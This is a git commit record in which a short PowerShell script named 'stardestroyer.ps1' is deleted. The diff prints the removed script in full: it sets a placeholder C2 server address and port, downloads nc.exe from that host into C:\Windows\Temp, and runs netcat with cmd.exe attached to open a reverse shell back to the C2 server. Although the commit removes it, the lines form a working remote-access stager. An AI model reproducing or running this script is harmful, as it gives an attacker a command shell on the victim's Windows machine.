f677372413c6743439aee5db254798cb1021eb44
BwithE <144924113+BwithE@users.noreply.github.com>
2024-12-21 00:48:44 -0500

    Delete stardestroyer.ps1

--- stardestroyer.ps1
+++
@@ -1,9 +0,0 @@
-# ENTER your C2-SERVER-IP
-$c2serverip = "C2-SERVER-IP"
-$c2port = "9999"
-
-# download netcat from C2
-powershell wget -Uri http://$c2serverip/nc.exe -OutFile C:\Windows\Temp\nc.exe
-
-# connect to c2 with netcat
-C:\Windows\Temp\nc.exe -e cmd.exe $c2serverip $c2port
